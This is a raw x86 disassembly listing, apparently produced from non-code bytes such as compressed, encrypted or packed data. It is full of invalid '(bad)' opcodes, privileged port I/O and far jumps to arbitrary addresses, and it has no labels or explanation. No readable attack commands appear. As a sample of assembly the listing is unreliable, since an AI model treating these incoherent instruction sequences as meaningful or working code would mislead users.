  41c8ac:	(bad)  
  41c8ad:	mov    bh,BYTE PTR [eax-0x4884a79a]
  41c8b3:	sbb    eax,esp
  41c8b5:	sbb    eax,edi
  41c8b7:	xchg   BYTE PTR [ebx+0x3e07958b],ah
  41c8bd:	das    
  41c8be:	jmp    0x41c863
  41c8c0:	jl     0x41c883
  41c8c2:	push   edi
  41c8c3:	jae    0x41c8ab
  41c8c5:	bound  esi,QWORD PTR [edi+ebp*8+0x3bc93806]
  41c8cc:	mov    ah,0x5c
  41c8ce:	and    al,0xde
  41c8d0:	in     al,dx
  41c8d1:	sub    cl,BYTE PTR [ecx-0x6b]
  41c8d4:	and    eax,0x2d5bd22f
  41c8d9:	rol    BYTE PTR [edi+0x4c],cl
  41c8dc:	xchg   edx,eax
  41c8dd:	cli    
  41c8de:	xor    DWORD PTR [edx],ebp
  41c8e0:	imul   BYTE PTR [ebx-0x1ac5ba89]
  41c8e6:	retf   
  41c8e7:	jmp    0x91df3fab
  41c8ec:	cmp    ah,BYTE PTR [ecx+0x464d4926]
  41c8f2:	mov    ah,0xc9
  41c8f4:	loopne 0x41c8dc
  41c8f6:	xchg   ebx,eax
  41c8f7:	cmp    al,0x3d
  41c8f9:	and    eax,0xcbe733bf
  41c8fe:	aas    
  41c8ff:	(bad)  
  41c900:	loopne 0x41c8e7
  41c902:	and    DWORD PTR [ebx+eiz*4],eax
  41c905:	(bad)  
  41c906:	sbb    DWORD PTR [edx+0x38],esp
  41c909:	sbb    al,0xea
  41c90b:	lahf   
  41c90c:	xlat   BYTE PTR ds:[ebx]
  41c90d:	xchg   esi,eax
  41c90e:	es test eax,0xd7dda0eb
  41c914:	push   ss
  41c915:	in     eax,0xd6
  41c917:	nop
  41c918:	or     al,0x84
  41c91a:	and    dl,BYTE PTR [ecx-0x10]
  41c91d:	xchg   ebx,eax
  41c91e:	enter  0xce97,0x39
  41c922:	sbb    DWORD PTR [si],ebx
  41c925:	dec    ebp
  41c926:	adc    esi,ebx
  41c928:	fisub  DWORD PTR [edx+ecx*2]
  41c92b:	cmp    eax,0xbfd1472e
  41c930:	mov    eax,ds:0x5cfe4716
  41c935:	sub    DWORD PTR [esi],edi
  41c937:	sub    DWORD PTR [ecx],edi
  41c939:	mov    bl,0x2c
  41c93b:	int3   
  41c93c:	pop    ecx
  41c93d:	cmp    esp,ebp
  41c93f:	test   cl,0xab
  41c942:	(bad)  
  41c943:	push   edx
  41c944:	dec    edx
  41c945:	ja     0x41c933
  41c947:	cmp    al,0xb
  41c949:	call   FWORD PTR [ecx]
  41c94b:	pop    ds
  41c94c:	test   al,0x13
  41c94e:	dec    ecx
  41c94f:	cld    
  41c950:	pop    ss
  41c951:	dec    esp
  41c952:	cmp    al,0xb3
  41c954:	sub    BYTE PTR [ebp+ebx*4-0x716cfe81],bl
  41c95b:	lock lea ecx,[ecx-0x50889beb]
  41c962:	xor    bl,0xf2
  41c965:	or     BYTE PTR [eax+0x68],dh
  41c968:	and    eax,0xd29586ea
  41c96d:	in     eax,0xc9
  41c96f:	mov    ebp,DWORD PTR [ebp+0x51]
  41c972:	dec    esp
  41c973:	fiadd  WORD PTR [ebx+0x3a0b96a7]
  41c979:	mov    esp,0x2d5943af
  41c97e:	xchg   ebx,eax
  41c97f:	mov    ?,edi
  41c981:	shl    dh,cl
  41c983:	mov    esi,0xf7252fc1
  41c988:	jbe    0x41c950
  41c98a:	inc    edi
  41c98b:	push   ss
  41c98c:	xchg   edx,eax
  41c98d:	fidiv  WORD PTR [edi]
  41c98f:	mov    esi,0xb08688de
  41c994:	retf   
  41c995:	mov    edi,0x3691b365
  41c99a:	cdq    
  41c99b:	(bad)
  41c99e:	or     eax,DWORD PTR [esi+0x31]
  41c9a1:	call   0x41da:0x1f6f8f46
  41c9a8:	sub    al,0xf7
  41c9aa:	sahf   
  41c9ab:	lahf   
  41c9ac:	or     al,BYTE PTR [esi-0x36]
  41c9af:	adc    eax,0xcbb5b2e1
  41c9b4:	out    0x63,eax
  41c9b6:	aad    0x44
  41c9b8:	and    edx,ebp
  41c9ba:	loopne 0x41c987
  41c9bc:	out    dx,eax
  41c9bd:	jbe    0x41c9ec
  41c9bf:	dec    esp
  41c9c0:	cld    
  41c9c1:	cdq    
  41c9c2:	out    dx,al
  41c9c3:	xchg   ebp,eax
  41c9c4:	push   eax
  41c9c5:	pop    ecx
  41c9c6:	shl    BYTE PTR [ebp+0x11],1
  41c9c9:	push   ebp
  41c9ca:	scas   eax,DWORD PTR es:[edi]
  41c9cb:	mov    ah,0x90
  41c9cd:	(bad)  
  41c9ce:	std    
  41c9cf:	mov    edi,DWORD PTR [ebx+0x2daaf534]
  41c9d5:	jae    0x41c962
  41c9d7:	jmp    0x41c978
  41c9d9:	push   edx
  41c9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9db:	retf   
  41c9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9dd:	loope  0x41c9d0
  41c9df:	add    al,0x40
  41c9e1:	shl    edx,cl
  41c9e3:	adc    al,0xfb
  41c9e5:	dec    ebx
  41c9e6:	out    dx,eax
  41c9e7:	cmp    BYTE PTR [edi+0x1d],cl
  41c9ea:	sbb    al,0xf1
  41c9ec:	bound  esp,QWORD PTR [esp+edi*2]
  41c9ef:	jle    0x41c979
  41c9f1:	sub    DWORD PTR [edi+edi*4+0x78dc97c9],esp
  41c9f8:	repz xor eax,0x90f65908
  41c9fe:	inc    eax
  41c9ff:	ds pop esi
  41ca01:	push   0x33
  41ca03:	pop    ebx
  41ca04:	gs mov cl,0x64
  41ca07:	out    0x60,al
  41ca09:	outs   dx,DWORD PTR ds:[esi]
  41ca0a:	aad    0x52
  41ca0c:	fcom   QWORD PTR [eax]
  41ca0e:	rcl    BYTE PTR [ecx-0x51],cl
  41ca11:	hlt    
  41ca12:	fwait
  41ca13:	jne    0x41ca11
  41ca15:	ins    BYTE PTR es:[edi],dx
  41ca16:	xor    al,0x91
  41ca18:	jns    0x41c99c
  41ca1a:	je     0x41c9d3
  41ca1c:	pushf  
  41ca1d:	not    bl
  41ca1f:	sbb    eax,0xab07f126
  41ca24:	adc    ecx,DWORD PTR [eax-0x4bfd4654]
  41ca2a:	int    0x8
  41ca2c:	stc    
  41ca2d:	shl    BYTE PTR [bp+di+0x5957],0xca
  41ca33:	ins    DWORD PTR es:[edi],dx
  41ca34:	mov    edx,0xbdcaadcf
  41ca39:	mov    ebx,DWORD PTR es:[ebx]
  41ca3c:	pop    ebx
  41ca3d:	icebp  
  41ca3e:	ret    
  41ca3f:	mov    ds:0x3db17553,al
  41ca44:	inc    eax
  41ca45:	and    DWORD PTR [eax],0x37
  41ca48:	adc    al,0x67
  41ca4a:	(bad)  
  41ca4b:	into   
  41ca4c:	xchg   BYTE PTR [edi+0x49],dh
  41ca4f:	nop
  41ca50:	dec    eax
  41ca51:	fsub   st,st(1)
  41ca53:	or     DWORD PTR [ebx+ebx*1-0x13b17e99],edi
  41ca5a:	es (bad) 
  41ca5c:	(bad)  
  41ca5d:	out    dx,eax
  41ca5e:	popa   
  41ca5f:	dec    ebx
  41ca60:	push   eax
  41ca61:	cmovno ebp,DWORD PTR [edx-0x2d]
  41ca65:	jne    0x41ca26
  41ca67:	xchg   esp,eax
  41ca68:	adc    eax,0x711f0dc9
  41ca6d:	push   es
  41ca6e:	pop    es
  41ca6f:	call   0xcc39:0x7b79fbd
  41ca76:	cdq    
  41ca77:	sub    DWORD PTR [edi-0x2e5535f3],0x8be6c9e4
  41ca81:	jle    0x41cad7
  41ca83:	mov    al,0x98
  41ca85:	mov    al,0xb2
  41ca87:	test   cl,bl
  41ca89:	mov    bh,BYTE PTR [edx-0x33f5ed45]
  41ca8f:	adc    ebp,DWORD PTR [edx]
  41ca91:	adc    al,0xdd
  41ca93:	mov    bh,0x27
  41ca95:	push   ecx
  41ca96:	mov    ds:0x43621fb3,al
  41ca9b:	push   esp
  41ca9c:	sub    eax,ebp
  41ca9e:	lahf   
  41ca9f:	(bad)  
  41caa0:	loopne 0x41ca64
  41caa2:	in     eax,0xe8
  41caa4:	aaa    
  41caa5:	jnp    0x41caa1
  41caa7:	pushf  
  41caa8:	retf   
  41caa9:	scas   eax,DWORD PTR es:[edi]
  41caaa:	xor    dl,BYTE PTR [eax]
  41caac:	shl    DWORD PTR [edx+eiz*8],0xc
  41cab0:	repz and ah,dh
  41cab3:	sbb    eax,0xcb00068e
  41cab8:	outs   dx,BYTE PTR ds:[esi]
  41cab9:	mov    dh,0xa2
  41cabb:	arpl   WORD PTR [edi-0x4a],ax
  41cabe:	pop    esp
  41cabf:	test   DWORD PTR [ebp+0x2036f8e4],0x4063129f
  41cac9:	push   es
  41caca:	jle    0x41cb1a
  41cacc:	mov    ebx,esp
  41cace:	out    0xdd,al
  41cad0:	nop
  41cad1:	rcl    dh,1
  41cad3:	adc    eax,DWORD PTR [edi+0x15]
  41cad6:	and    DWORD PTR [edx+ebp*4-0x5],edi
  41cada:	xor    edi,DWORD PTR [edi+0x1c]
  41cadd:	push   0xa
  41cadf:	cmp    BYTE PTR [ebp-0x30fba753],0xbb
  41cae6:	push   ss
  41cae7:	not    DWORD PTR [ebx-0x3b]
  41caea:	mov    gs,WORD PTR [ecx]
  41caec:	xor    al,0xff
  41caee:	push   esi
  41caef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf0:	push   ds
  41caf1:	add    al,0x6
  41caf3:	mov    ?,WORD PTR [eax+0x4c826f3a]
  41caf9:	jno    0x41cb54
  41cafb:	mov    ah,0x30
  41cafd:	push   edi
  41cafe:	xor    BYTE PTR [ebx],cl
  41cb00:	pop    esi
  41cb01:	xor    BYTE PTR [esi+0x11],ch
  41cb04:	iret   
  41cb05:	pop    ds
  41cb06:	and    ebx,DWORD PTR [ebx+ebp*1]
  41cb09:	out    dx,eax
  41cb0a:	mov    DWORD PTR ds:0x7b18e198,esi
  41cb10:	sub    DWORD PTR [ecx+esi*8-0x7915861a],ecx
  41cb17:	jmp    0x33c985ac
  41cb1c:	xor    DWORD PTR [ecx-0x42165335],ebp
  41cb22:	out    dx,eax
  41cb23:	mov    ebx,0x31ab2cb6
  41cb28:	cmc    
  41cb29:	jo     0x41caf6
  41cb2b:	jecxz  0x41cb19
  41cb2d:	xor    eax,0x9dd64fc3
  41cb32:	mov    dl,0x90
  41cb34:	sbb    DWORD PTR [ebx],ebx
  41cb36:	imul   esp,DWORD PTR [eax+0x53efb7d7],0x21
  41cb3d:	mov    al,0xa5
  41cb3f:	and    DWORD PTR [eax-0x3f],ecx
  41cb42:	mov    edx,0xbf30b616
  41cb47:	js     0x41cbc5
  41cb49:	cld    
  41cb4a:	push   esi
  41cb4b:	icebp  
  41cb4c:	imul   esp,DWORD PTR [ebp-0x587ea2a2],0xedbadba8
  41cb56:	or     dl,BYTE PTR [ecx]
  41cb58:	fcmovbe st,st(5)
  41cb5a:	xchg   DWORD PTR [edi-0x71890c15],ebp
  41cb60:	cmp    ecx,DWORD PTR [edi-0x2e495276]
  41cb66:	fs int3 
  41cb68:	retf   0xda1d
  41cb6b:	pop    edx
  41cb6c:	add    ebp,esp
  41cb6e:	push   es
  41cb6f:	xor    eax,0x8ed440c5
  41cb74:	inc    edx
  41cb75:	mov    al,ds:0xc5c25f0b
  41cb7a:	or     BYTE PTR [edi],dl
  41cb7c:	dec    ecx
  41cb7d:	in     al,dx
  41cb7e:	addr16 mov dl,0xb7
  41cb81:	mov    edi,0xc7c67b9d
  41cb86:	xlat   BYTE PTR ds:[ebx]
  41cb87:	push   ss
  41cb88:	mov    DWORD PTR [eax-0x5e],esi
  41cb8b:	sub    cl,BYTE PTR [ebx-0xa782471]
  41cb91:	dec    edx
  41cb92:	out    dx,eax
  41cb93:	push   ds
  41cb94:	stos   DWORD PTR es:[edi],eax
  41cb95:	xchg   edx,esi
  41cb97:	loopne 0x41cc03
  41cb99:	fadd   DWORD PTR [edi]
  41cb9b:	jmp    0x41cb24
  41cb9d:	and    DWORD PTR [eax],0x522878ed
  41cba3:	or     ebx,DWORD PTR [edx-0x30b5a53a]
  41cba9:	in     al,dx
  41cbaa:	int    0x45
  41cbac:	pop    esp
  41cbad:	adc    DWORD PTR [ecx],edi
  41cbaf:	aas    
  41cbb0:	push   ebx
  41cbb1:	fld    TBYTE PTR [edx-0x3b67e8d7]
  41cbb7:	dec    eax
  41cbb8:	mov    edx,0x4bcec634
  41cbbd:	lds    esp,FWORD PTR [edx]
  41cbbf:	or     ebp,DWORD PTR [eax]
  41cbc1:	jmp    0x26beab2e
  41cbc6:	push   ss
  41cbc7:	add    DWORD PTR [eax],esi
  41cbc9:	dec    ecx
  41cbca:	jp     0x41cbdd
  41cbcc:	cmp    eax,0xfe478284
  41cbd1:	mov    ebx,0xe931b280
  41cbd6:	out    0xba,al
  41cbd8:	xchg   ebp,eax
  41cbd9:	aam    0x72
  41cbdb:	push   eax
  41cbdc:	fcmovnb st,st(6)
  41cbde:	je     0x41cc01
  41cbe0:	jl     0x41cbd0
  41cbe2:	add    eax,ecx
  41cbe4:	cmp    eax,0x5992fed0
  41cbe9:	push   gs
  41cbeb:	mov    bl,0x99
  41cbed:	aad    0x8f
  41cbef:	inc    esp
  41cbf0:	adc    al,0xb8
  41cbf2:	dec    edi
  41cbf3:	xchg   DWORD PTR [ebp-0x7ff5ff3e],eax
  41cbf9:	repnz pop edx
  41cbfb:	addr16 int3 
  41cbfd:	(bad)  
  41cbfe:	mov    cl,0xdd
  41cc00:	inc    ebx
  41cc01:	dec    edx
  41cc02:	fstp   st(7)
  41cc04:	ret    0x844e
  41cc07:	popa   
  41cc08:	xor    eax,0x7e6cf48e
  41cc0d:	and    BYTE PTR ds:0x1286bd8f,cl
  41cc13:	fdiv   QWORD PTR [ebx]
  41cc15:	xchg   edx,eax
  41cc16:	mov    al,0x91
  41cc18:	jmp    0x41cc3c
  41cc1a:	jmp    0x7e7f:0x3716c89c
  41cc21:	mov    bl,0xf1
  41cc23:	push   0x45265d08
  41cc28:	sub    eax,0xbb009b5
  41cc2d:	fisttp QWORD PTR [eax-0x14]
  41cc30:	pop    eax
  41cc31:	mov    eax,DWORD PTR [edx-0x80]
  41cc34:	not    BYTE PTR [ebp+0x629c0d1f]
  41cc3a:	fs mov dh,0xae
  41cc3d:	mov    ah,BYTE PTR [esi+eiz*1+0x5a]
  41cc41:	ss jae 0x41ccb7
  41cc44:	(bad)  
  41cc45:	xchg   edi,eax
  41cc46:	lea    eax,[esi-0x4d]
  41cc49:	mov    ebx,eax
  41cc4b:	add    BYTE PTR [eax-0x758630ad],bl
  41cc51:	bound  edi,QWORD PTR [ebp-0x59]
  41cc54:	imul   ecx,DWORD PTR [edi],0x8984d807
  41cc5a:	push   ebx
  41cc5b:	out    0xd9,al
  41cc5d:	xlat   BYTE PTR ds:[ebx]
  41cc5e:	xchg   ebx,eax
  41cc5f:	mov    eax,0xb3c304a
  41cc64:	sbb    eax,0x8b43a24c
  41cc69:	cld    
  41cc6a:	and    esi,ecx
  41cc6c:	sti    
  41cc6d:	retf   
  41cc6e:	inc    ebp
  41cc6f:	les    esi,FWORD PTR [eax-0x20]
  41cc72:	mov    esp,eax
  41cc74:	fwait
  41cc75:	(bad)  
  41cc76:	outs   dx,BYTE PTR ds:[esi]
  41cc77:	xchg   ebx,eax
  41cc78:	cmp    eax,0x1b45b79a
  41cc7d:	push   eax
  41cc7e:	and    ecx,DWORD PTR [edi]
  41cc80:	sub    BYTE PTR [esi+eax*1],0x1f
  41cc84:	not    BYTE PTR [esp+edi*2+0x78]
  41cc88:	fimul  WORD PTR [ebx+0x1c8b8087]
  41cc8e:	loopne 0x41cc63
  41cc90:	jle    0x41ccca
  41cc92:	fstp   DWORD PTR [edx]
  41cc95:	fdiv   DWORD PTR [eax-0x71956901]
  41cc9b:	pop    ds
  41cc9c:	xor    ecx,ecx
  41cc9e:	daa    
  41cc9f:	mov    ch,0x2a
  41cca1:	sar    DWORD PTR [eax],0x19
  41cca4:	push   eax
  41cca5:	push   ss
  41cca6:	sub    edx,esp
  41cca8:	or     cl,BYTE PTR [ecx+0x33f403d5]
  41ccae:	dec    esi
  41ccaf:	imul   ebp,ebp,0x35abbd74
  41ccb5:	cs inc esp
  41ccb7:	stos   BYTE PTR es:[edi],al
  41ccb8:	adc    al,0x9b
  41ccba:	js     0x41ccb2
  41ccbc:	loopne 0x41ccf9
  41ccbe:	iret   
  41ccbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccc0:	and    al,0xfc
  41ccc2:	stos   DWORD PTR es:[edi],eax
  41ccc3:	cld    
  41ccc4:	mov    esp,0x130764f0
  41ccc9:	inc    edi
  41ccca:	cmp    eax,0xfbc1cc10
  41cccf:	int    0xdc
  41ccd1:	pop    esi
  41ccd2:	sti    
  41ccd3:	push   0xfffffff3
  41ccd5:	mov    dl,0x43
  41ccd7:	lahf   
  41ccd8:	push   eax
  41ccd9:	inc    ecx
  41ccda:	(bad)
  41ccde:	clc    
  41ccdf:	sub    bh,BYTE PTR [edi]
  41cce1:	mov    edi,0xa64f420
  41cce6:	nop
  41cce7:	cld    
  41cce8:	aaa    
  41cce9:	pushf  
  41ccea:	cwde   
  41cceb:	fstp   DWORD PTR [ecx+0x75efae55]
  41ccf1:	dec    edi
  41ccf2:	jl     0x41cca2
  41ccf4:	and    al,0xe5
  41ccf6:	add    ch,ch
  41ccf8:	mov    ecx,0x73b9f496
  41ccfd:	pushf  
  41ccfe:	jnp    0x41cd51
  41cd00:	or     eax,0x154d05ba
  41cd05:	sub    ch,BYTE PTR [ecx+0x5a]
  41cd08:	in     al,dx
  41cd09:	in     eax,0xad
  41cd0b:	stos   BYTE PTR es:[edi],al
  41cd0c:	push   ebp
  41cd0d:	pop    esp
  41cd0e:	fistp  DWORD PTR [esi+0x2f]
  41cd11:	and    eax,0xa8520978
  41cd16:	call   0x5f56c6d0
  41cd1b:	or     DWORD PTR [ebp+0x57],0xffffff8d
  41cd1f:	push   ds
  41cd20:	imul   edx,DWORD PTR [ecx],0x72d588d3
  41cd26:	popf   
  41cd27:	jae    0x41ccc3
  41cd29:	xor    DWORD PTR [eax+0x4d4477bd],ebp
  41cd2f:	inc    esi
  41cd30:	adc    ch,BYTE PTR [ebx]
  41cd32:	test   dl,0x7
  41cd35:	aaa    
  41cd36:	xor    BYTE PTR [esp+esi*1-0x24],dh
  41cd3a:	dec    ebp
  41cd3b:	jg     0x41cce9
  41cd3d:	xchg   ebx,eax
  41cd3e:	std    
  41cd3f:	daa    
  41cd40:	sub    BYTE PTR [esi],0x32
  41cd43:	lahf   
  41cd44:	shr    dh,cl
  41cd46:	mov    ebx,0x6bffeec8
  41cd4b:	pop    es
  41cd4c:	xchg   ebx,eax
  41cd4d:	jg     0x41cdc0
  41cd4f:	push   0xffffffd2
  41cd51:	mov    DWORD PTR [esp+ebx*4],esp
  41cd54:	mov    esi,0x492402c
  41cd59:	cld    
  41cd5a:	shl    DWORD PTR [edi+0x76],1
  41cd5d:	dec    edx
  41cd5e:	sbb    eax,0xb2416065
  41cd63:	pop    ebp
  41cd64:	add    esp,0x4f33222a
  41cd6a:	icebp  
  41cd6b:	xchg   edx,eax
  41cd6c:	xchg   esi,eax
  41cd6d:	or     ah,BYTE PTR [edi+eiz*2-0x4d8bb9e6]
  41cd74:	jl     0x41cdc7
  41cd76:	repz jmp 0x278aee9f
  41cd7c:	out    dx,al
  41cd7d:	lock and BYTE PTR [ebx],cl
  41cd80:	repnz repz mov ?,edi
  41cd84:	xor    DWORD PTR [ebx-0x6f],ebx
  41cd87:	sub    bh,bh
  41cd89:	pop    ds
  41cd8a:	shr    DWORD PTR [ecx-0x685da5fb],1
  41cd90:	add    BYTE PTR [edx-0x67],bh
  41cd93:	aas    
  41cd94:	dec    edx
  41cd95:	mov    BYTE PTR [edx+edi*4-0x69],ch
  41cd99:	or     BYTE PTR [ebp+0x3a],ah
  41cd9c:	push   0x4bc06fe2
  41cda1:	(bad)  
  41cda2:	(bad)  
  41cda3:	stos   DWORD PTR es:[edi],eax
  41cda4:	adc    ah,BYTE PTR [edi]
  41cda6:	mov    eax,0x63b7caa5
  41cdab:	adc    dl,BYTE PTR [esi]
  41cdad:	popf   
  41cdae:	mov    ds:0x864f5c9c,eax
  41cdb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb4:	push   ds
  41cdb5:	lahf   
  41cdb6:	dec    edx
  41cdb7:	xchg   esp,eax
  41cdb8:	je     0x41ce28
  41cdba:	cmp    BYTE PTR [ebx+0x588aa0bc],0x92
  41cdc1:	loop   0x41cd4e
  41cdc3:	mov    ecx,0xb36b1082
  41cdc8:	cmp    eax,0x4ea18c66
  41cdcd:	dec    esi
  41cdce:	sbb    esp,DWORD PTR ds:0xba2e071
  41cdd4:	add    esi,DWORD PTR [edx-0x65a19bcd]
  41cdda:	xor    dl,BYTE PTR [edx]
  41cddc:	ins    BYTE PTR es:[edi],dx
  41cddd:	cld    
  41cdde:	push   esi
  41cddf:	mov    dh,0x33
  41cde1:	or     DWORD PTR [eax+0x444357b9],eax
  41cde7:	lea    edx,[ecx+0x31772b7c]
  41cded:	mov    DWORD PTR [ebp+edx*4+0x2cad53cc],esp
  41cdf4:	push   ebx
  41cdf5:	xchg   BYTE PTR [ebx+esi*1-0x2ffe07f7],bh
  41cdfc:	sub    eax,0x5af5a466
  41ce01:	mov    WORD PTR [ebx+eax*2],ss
  41ce04:	into   
  41ce05:	add    al,0x27
  41ce07:	ds jns 0x41ce3d
  41ce0a:	repz mov al,0x47
  41ce0d:	ret    0x4d31
  41ce10:	ins    BYTE PTR es:[edi],dx
  41ce11:	mov    edx,0xcfaf584e
  41ce16:	lods   al,BYTE PTR ds:[esi]
  41ce17:	pop    ds
  41ce18:	std    
  41ce19:	mov    eax,0xbfffdc13
  41ce1e:	cmp    edi,esp
  41ce20:	push   ss
  41ce21:	hlt    
  41ce22:	test   edi,ebx
  41ce24:	leave  
  41ce25:	mov    bh,0x34
  41ce27:	shr    esp,0xcb
  41ce2a:	and    eax,0x1dcf7da3
  41ce2f:	or     ah,BYTE PTR [edi]
  41ce31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce32:	sbb    DWORD PTR [edi-0x5af091ee],eax
  41ce38:	fisttp DWORD PTR [edx-0x52]
  41ce3b:	xchg   edi,eax
  41ce3c:	dec    ebp
  41ce3d:	jl     0x41ce12
  41ce3f:	mov    ds:0xab001b84,al
  41ce44:	cdq    
  41ce45:	int3   
  41ce46:	cmp    esp,DWORD PTR [ebx]
  41ce48:	xchg   edi,eax
  41ce49:	bndldx bnd1,[edi+0x4534301c]
  41ce50:	add    al,0x3f
  41ce52:	adc    BYTE PTR [ebx*4+0x1be800c1],cl
  41ce59:	sbb    eax,0xf9e519b1
  41ce5e:	or     BYTE PTR [ebx-0x2d0b8a12],0xcc
  41ce65:	mov    edi,0xf9ba5ca2
  41ce6a:	int    0x93
  41ce6c:	mov    esp,DWORD PTR [ebp+0x2c7141d5]
  41ce72:	push   edi
  41ce73:	inc    ebx
  41ce74:	and    DWORD PTR [edx],edx
  41ce76:	iret   
  41ce77:	ss xchg edi,eax
  41ce79:	out    0x70,al
  41ce7b:	and    BYTE PTR [esi],0xaa
  41ce7e:	sub    edi,eax
  41ce80:	stc    
  41ce81:	or     bh,BYTE PTR [esi-0x42]
  41ce84:	mov    ah,0xcb
  41ce86:	dec    edx
  41ce87:	retf   
  41ce88:	pop    edx
  41ce89:	jae    0x41ce2d
  41ce8b:	mov    esp,0x60776649
  41ce90:	mov    edi,0x1cac0f64
  41ce95:	(bad)  
  41ce96:	or     al,0x4a
  41ce98:	mov    al,ds:0x3b40dbe0
  41ce9d:	mov    bh,0x2f
  41ce9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cea0:	add    BYTE PTR [eax],dh
  41cea2:	sub    dl,BYTE PTR [edi-0x63]
  41cea5:	loop   0x41cecc
  41cea7:	jp     0x41ce3e
  41cea9:	(bad)  
  41ceaa:	retf   0x2903
  41cead:	je     0x41ce8b
  41ceaf:	pop    edx
  41ceb0:	nop
  41ceb1:	xlat   BYTE PTR ds:[ebx]
  41ceb2:	out    0xb5,al
  41ceb4:	jecxz  0x41ced2
  41ceb6:	adc    al,0x9c
  41ceb8:	in     eax,0x1d
  41ceba:	pop    ecx
  41cebb:	daa    
  41cebc:	cmp    ebx,DWORD PTR [esi]
  41cebe:	xor    DWORD PTR [edi+esi*2],ebp
  41cec1:	sti    
  41cec2:	cmp    DWORD PTR [edx-0x6b842859],edi
  41cec8:	xchg   esp,eax
  41cec9:	pop    es
  41ceca:	hlt    
  41cecb:	sub    DWORD PTR [ebx],ebp
  41cecd:	dec    ebp
  41cece:	clc    
  41cecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ced0:	out    0xa0,al
  41ced2:	out    0x53,al
  41ced4:	xlat   BYTE PTR ds:[ebx]
  41ced5:	rcr    BYTE PTR [eax-0x3dd0fe65],0x5c
  41cedc:	fiadd  DWORD PTR [eax-0x3f78d994]
  41cee2:	lods   eax,DWORD PTR ds:[esi]
  41cee3:	mov    ds:0xa7e779ff,eax
  41cee8:	lahf   
  41cee9:	fwait
  41ceea:	pop    eax
  41ceeb:	and    DWORD PTR [ecx+eiz*8+0x2d],0xcb7e5691
  41cef3:	rcl    BYTE PTR [ebp+0x63],cl
  41cef6:	ins    DWORD PTR es:[edi],dx
  41cef7:	jb     0x41cf6a
  41cef9:	sub    di,cx
  41cefc:	xor    al,0xcb
  41cefe:	std    
  41ceff:	in     al,0x3a
  41cf01:	(bad)  
  41cf02:	outs   dx,BYTE PTR ds:[esi]
  41cf03:	icebp  
  41cf04:	jp     0x41cf72
  41cf06:	mov    bh,0xf7
  41cf08:	dec    esi
  41cf09:	idiv   BYTE PTR [esi]
  41cf0b:	push   0xd2ea91a4
  41cf10:	jb     0x41cee5
  41cf12:	pop    esi
  41cf13:	inc    esi
  41cf14:	in     eax,dx
  41cf15:	xlat   BYTE PTR ds:[ebx]
  41cf16:	jne    0x41cf90
  41cf18:	xor    eax,ecx
  41cf1a:	cli    
  41cf1b:	lahf   
  41cf1c:	int3   
  41cf1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf1e:	jmp    0x61dc5b65
  41cf23:	repz pop ebp
  41cf25:	xchg   ebp,eax
  41cf26:	xor    BYTE PTR [ecx],al
  41cf28:	dec    ebx
  41cf29:	jmp    0x2ee3b7d2
  41cf2e:	lahf   
  41cf2f:	pop    esi
  41cf30:	push   edi
  41cf31:	mov    eax,0x59f9236c
  41cf36:	pop    esp
  41cf37:	cld    
  41cf38:	fstp   TBYTE PTR [edi-0x3]
  41cf3b:	xchg   esp,eax
  41cf3c:	dec    edi
  41cf3d:	sub    bl,BYTE PTR [ebp+0x557a5573]
  41cf43:	int3   
  41cf44:	pop    esp
  41cf45:	rcl    DWORD PTR [eax+eax*2-0x71af2c65],cl
  41cf4c:	loope  0x41cf1d
  41cf4e:	dec    esi
  41cf4f:	ror    BYTE PTR [ebp-0x77],1
  41cf52:	jo     0x41cf41
  41cf54:	sti    
  41cf55:	sbb    BYTE PTR [ecx-0x36b19df6],al
  41cf5b:	xchg   DWORD PTR es:[ebx+0x56c7d775],edi
  41cf62:	or     al,0xf9
  41cf64:	mov    eax,ds:0x3db263ef
  41cf69:	mov    WORD PTR [edi-0x52e7373a],?
  41cf6f:	jge    0x41cf01
  41cf71:	sbb    DWORD PTR [ebx-0x29ca9e49],ecx
  41cf77:	jl     0x41cf71
  41cf79:	xchg   ebx,eax
  41cf7a:	xor    DWORD PTR [ebx-0xc022156],ebp
  41cf80:	and    ecx,DWORD PTR [ecx-0x34c6c3a8]
  41cf86:	mov    al,ds:0x45c4a940
  41cf8b:	test   eax,0x8d664d1e
  41cf90:	sub    eax,0x55b73c38
  41cf95:	in     eax,dx
  41cf96:	mov    ch,0x67
  41cf98:	loope  0x41cfd3
  41cf9a:	and    ebp,DWORD PTR [edx-0xb]
  41cf9d:	jmp    0xa0f1:0xb2300a6b
  41cfa4:	cmp    BYTE PTR [ecx+0x7f],ch
  41cfa7:	add    BYTE PTR [ebp+edi*4+0x1a],0x8c
  41cfac:	test   eax,0x28e8dad5
  41cfb1:	leave  
  41cfb2:	rcl    esi,1
  41cfb4:	cs jnp 0x41cf99
  41cfb7:	sub    al,0x93
  41cfb9:	add    ah,ah
  41cfbb:	dec    eax
  41cfbc:	jle    0x41cf7f
  41cfbe:	jns    0x41cfef
  41cfc0:	aaa    
  41cfc1:	cmp    BYTE PTR [edx+0x3f],0x9e
  41cfc5:	imul   eax,DWORD PTR [eax-0x5f],0x2c
  41cfc9:	int    0x2d
  41cfcb:	mov    ecx,0x7a5417d8
  41cfd0:	or     DWORD PTR [esi+0x22],eax
  41cfd3:	mov    esi,0x3f77ace2
  41cfd8:	(bad)  
  41cfd9:	ror    DWORD PTR [eax+0x4c],1
  41cfdc:	iret   
  41cfdd:	mov    al,ds:0xe1dad51c
  41cfe2:	mov    bh,0x40
  41cfe4:	mov    fs,ebp
  41cfe6:	sbb    al,0xcd
  41cfe8:	and    al,0xfa
  41cfea:	adc    bh,BYTE PTR [edx-0x25]
  41cfed:	or     ch,BYTE PTR [esi+0x612a54a3]
  41cff3:	push   ecx
  41cff4:	xchg   DWORD PTR [esi],ebp
  41cff6:	add    edi,DWORD PTR [ebp+0x2129cd4e]
  41cffc:	ds lahf 
  41cffe:	mov    edx,DWORD PTR [ecx]
  41d000:	xchg   esp,eax
  41d001:	add    eax,edx
  41d003:	jnp    0x41d082
  41d005:	sbb    al,0xc4
  41d007:	imul   edi,edi,0x7d
